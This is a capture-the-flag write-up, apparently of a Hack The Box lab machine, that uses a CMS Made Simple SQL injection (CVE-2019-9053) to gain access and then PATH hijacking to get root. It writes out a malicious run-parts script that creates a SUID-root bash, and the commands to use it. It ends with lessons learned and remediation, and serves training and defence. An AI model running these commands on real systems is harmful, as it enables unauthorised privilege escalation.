Summary

Writeup exposed a small web application on port 80 and SSH on port 22. The homepage included a warning about an Eeyore DoS protection script, so I avoided aggressive brute forcing and focused on careful manual enumeration. The robots.txt file revealed the hidden /writeup/ path.

The /writeup/ directory hosted CMS Made Simple. The detected CMS version was vulnerable to CVE-2019-9053, an unauthenticated SQL injection vulnerability. Using the vulnerability, I extracted password hash material for the user jkr, cracked it, and used the recovered credentials to log in over SSH.

After gaining access as jkr, local enumeration showed that the user could write to /usr/local/bin. Since that directory appeared early in the PATH, I abused a PATH hijacking weakness by placing a malicious run-parts script there. When root executed run-parts, my script created a SUID-root Bash binary, allowing root access.

Reconnaissance

I started with a TCP scan to identify exposed services on the target.

nmap -sC -sV -oN Files/nmap_initial 10.129.29.59

The important open ports were:

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

The HTTP service showed Apache running on Debian:

Server: Apache/2.4.25 (Debian)

The web page title suggested that the site was not fully built yet. 

<title>Nothing here yet.</title>

The page also exposed a contact email address: 

jkr@writeup.htb

This was useful because jkr later turned out to be a valid system username.

Web Enumeration

The homepage warned about an Eeyore DoS protection script that could ban clients causing too many Apache 40x errors. Because of this, I avoided noisy directory brute forcing and checked common files manually. 

curl http://10.129.29.59/robots.txt

The robots.txt file revealed a hidden path:

Disallow: /writeup/

I then visited the discovered directory:

curl http://10.129.29.59/writeup/

The page contained links to multiple writeups:

/writeup/index.php?page=ypuffy
/writeup/index.php?page=blue
/writeup/index.php?page=writeup

The page source also showed the base path:

<base href="http://writeup.htb/writeup/" />

Based on the page metadata and structure, the site was identified as CMS Made Simple.

Vulnerability Identification

CMS Made Simple was detected at /writeup/. The version was associated with CVE-2019-9053, an unauthenticated SQL injection vulnerability.

CVE-2019-9053
Unauthenticated SQL Injection

A public exploit was available as 46635.py, but it was written for Python 2. Since Python 2 was not available locally, I used a Python 3-compatible exploit source instead.

Privilege Escalation Enumeration

I started local enumeration by checking the current user, groups, writable paths, PATH order, and SUID binaries. 

id
echo $PATH
find / -perm -4000 -type f 2>/dev/null

The SUID binaries included:

/usr/bin/pkexec
/bin/su
/bin/mount
/bin/umount
/usr/bin/passwd
/usr/lib/openssh/ssh-keysign
/usr/bin/vmware-user-suid-wrapper

The important discovery was that jkr had access related to the staff group, and could write to /usr/local/bin. 

ls -ld /usr/local/bin

Since /usr/local/bin appeared early in the PATH, this created a possible PATH hijacking opportunity. If a root-owned process executed a command by name instead of using an absolute path, Linux could run a malicious command from /usr/local/bin first.

Privilege Escalation with PATH Hijacking

The target eventually executed run-parts as root without specifying the full path. Because I could write to /usr/local/bin, I created a malicious run-parts script in that directory. 

cat > /usr/local/bin/run-parts <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF

I made the script executable:

chmod +x /usr/local/bin/run-parts

After the root-executed process triggered run-parts, the script created a SUID-root Bash binary in /tmp. 

ls -la /tmp/rootbash

The file had the SUID bit set and was owned by root:

-rwsr-xr-x 1 root root 1099016 Jul  8 02:30 /tmp/rootbash

I executed Bash with the -p option to preserve the effective user ID: 

/tmp/rootbash -p

Root access was confirmed:

id
uid=1000(jkr) euid=0(root)

Root Flag

With effective root privileges, I was able to access the root flag. 

cat /root/root.txt
root flag: [REDACTED]

Cleanup

After completing the machine, cleanup would include removing the malicious files created during privilege escalation. 

rm -f /usr/local/bin/run-parts
rm -f /tmp/rootbash

Attack Path

1. Enumerated open ports and found SSH and HTTP.
2. Checked the web service and found Apache on Debian.
3. Reviewed robots.txt and discovered /writeup/.
4. Identified CMS Made Simple at /writeup/.
5. Matched the CMS to CVE-2019-9053.
6. Exploited unauthenticated SQL injection to extract credential material.
7. Cracked the hash and recovered credentials for jkr.
8. Logged in over SSH as jkr.
9. Found that jkr could write to /usr/local/bin.
10. Abused PATH hijacking by creating /usr/local/bin/run-parts.
11. Waited for root to execute run-parts through PATH.
12. Created /tmp/rootbash with SUID-root permissions.
13. Ran /tmp/rootbash -p and gained effective root privileges.

Lessons Learned

  • robots.txt can reveal hidden application paths that are not linked from the main page.
  • Warnings about anti-bruteforce or DoS protection should change the enumeration approach.
  • CMS metadata can quickly point to known public vulnerabilities.
  • Older public exploits may need to be converted or replaced if they depend on Python 2.
  • Time-based SQL injection can produce bad data, so extracted hashes and salts should be validated.
  • Password reuse between a web application and a Linux account can turn a web bug into SSH access.
  • Linux group membership matters during privilege escalation.
  • Writable directories early in PATH can be dangerous when privileged scripts call binaries by name.

Remediation

  • Upgrade CMS Made Simple to a patched version that is not vulnerable to CVE-2019-9053.
  • Remove old or unused CMS installations from production systems.
  • Do not rely on robots.txt to hide sensitive paths.
  • Use unique passwords for web applications and system accounts.
  • Disable SSH password authentication where possible and prefer SSH keys.
  • Restrict write access to directories included in privileged PATH values.
  • Ensure root-owned scripts use absolute paths such as /bin/run-parts or /usr/bin/run-parts.
  • Set a safe PATH inside privileged scripts.
  • Monitor for suspicious files created in /usr/local/bin and /tmp.
  • Regularly audit SUID files for unexpected additions.

Conclusion

Writeup demonstrated how careful web enumeration can lead to a hidden application and how a known CMS vulnerability can provide valid credentials. The exposed CMS Made Simple instance allowed unauthenticated SQL injection, which led to credential recovery for the jkr user.

After SSH access was obtained, privilege escalation came from a Linux PATH hijacking weakness. Because jkr could write to /usr/local/bin, and a root process executed run-parts by name, I was able to create a SUID-root Bash binary and gain root access.
